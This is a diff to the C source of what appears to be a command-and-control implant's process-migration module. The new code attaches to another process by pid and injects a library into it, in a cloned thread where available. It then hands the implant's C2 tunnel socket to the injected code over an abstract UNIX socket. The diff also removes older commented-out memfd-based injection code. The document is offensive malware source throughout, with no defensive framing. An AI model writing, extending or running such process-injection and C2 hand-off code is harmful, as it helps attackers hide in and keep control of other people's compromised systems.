@@ -27,6 +27,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stddef.h>
+#include <fcntl.h>
 
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -36,55 +37,35 @@
 #include <syscall.h>
 #endif
 
-/*
 #ifndef IS_IPHONE
 #include <injector.h>
-#include <injector_internal.h>
-#endif*/
+#endif
 
 #include <c2.h>
 #include <log.h>
 #include <migrate.h>
+#include <net_client.h>
 
-#ifndef IS_WINDOWS
-#include <dlfcn.h>
-#endif
-
-ssize_t shared_read_sock(int shared, void *buf,
-                         size_t length, int *sock)
+static int shared_listen(const char *name)
 {
-    ssize_t bytes_read;
+    int shared;
+    struct sockaddr_un address;
 
-    struct iovec iov;
-    struct msghdr msg;
-    struct cmsghdr *pcmsghdr;
+    memset(&address, 0, sizeof(address));
 
-    char buffer[CMSG_SPACE(sizeof(int))];
+    shared = socket(AF_UNIX, SOCK_STREAM, 0);
+    address.sun_family = AF_UNIX;
+    strcpy(address.sun_path, name);
 
-    iov.iov_base = buf;
-    iov.iov_len = length;
-    msg.msg_name = NULL;
-    msg.msg_namelen = 0;
-    msg.msg_iov = &iov;
-    msg.msg_iovlen = 1;
-    msg.msg_control = buffer;
-    msg.msg_controllen = sizeof(buffer);
-    msg.msg_flags = 0;
+    address.sun_path[0] = 0;
+    bind(shared, (struct sockaddr *)&address, sizeof(address));
 
-    bytes_read = recvmsg(shared, &msg, 0);
-    if (bytes_read < 0)
-    {
-        return -1;
-    }
-
-    pcmsghdr = CMSG_FIRSTHDR(&msg);
-    *sock = *((int*)CMSG_DATA(pcmsghdr));
-
-    return bytes_read;
+    listen(shared, 100);
+    return accept(shared, NULL, NULL);
 }
 
-ssize_t shared_send_sock(int shared, const void *buf,
-                         size_t length, int sock)
+static ssize_t shared_send_sock(int shared, const void *buf,
+                                size_t length, int sock)
 {
     struct iovec iov;
     struct msghdr msg;
@@ -111,66 +92,39 @@ ssize_t shared_send_sock(int shared, const void *buf,
     return sendmsg(shared, &msg, 0);
 }
 
-int migrate_init(pid_t pid, int length, unsigned char *buffer)
-{/*
-#if IS_LINUX
-    int memfd;
-    char image[PATH_MAX];
-
-    memfd = syscall(SYS_memfd_create, "", MFD_CLOEXEC);
-
-    if (fd >= 0)
-    {
-        write(memfd, buffer, length);
-        sprintf(image, "/proc/self/fd/%d", memfd);
-
-        migrate_inject(pid, image);
-        return 0;
-    }
-#endif*/
-
-    return -1;
-}
-
-int migrate_inject(pid_t pid, char *image)
-{/*
-#ifndef IS_IPHONE
-#ifndef IS_WINDOWS
-    long retval;
-    size_t func_addr;
-#endif
-
+static int migrate_inject(pid_t pid, char *path, int sock)
+{
+    int shared;
+    char buffer[4];
     injector_t *injector;
-    void *handle;
 
     if (injector_attach(&injector, pid) < 0)
     {
+        log_debug("Failed to attach to (%d) - (%s)\n", pid, injector_error());
         return -1;
     }
 
     log_debug("* Attached to the process (%d)\n", pid);
 
 #ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
-    if (injector_inject_in_cloned_thread(injector, image, handle) < 0)
-    {
-        goto fail;
-    }
+    injector_inject_in_cloned_thread(injector, path, NULL);
 #else
-    if (injector_inject(injector, image, handle) < 0)
-    {
-        goto fail;
-    }
+    injector_inject(injector, path, NULL);
 #endif
 
     log_debug("* Injected to the process (%d)\n", pid);
-    injector_detach(injector);
+
+    shared = shared_listen("#IPCSocket");
+    memset(buffer, 0, 4);
+    shared_send_sock(shared, buffer, 4, sock);
 
     return 0;
+}
 
-fail:
-    log_debug("* Failed to do inject (%s)\n", injector_error());
-    injector_detach(injector);
+int migrate_init(pid_t pid, char *path, c2_t *c2)
+{
+    net_t *net;
+    net = c2->tunnel->data;
 
-#endif*/
-    return -1;
+    return migrate_inject(pid, path, net->io->pipe[0]);
 }
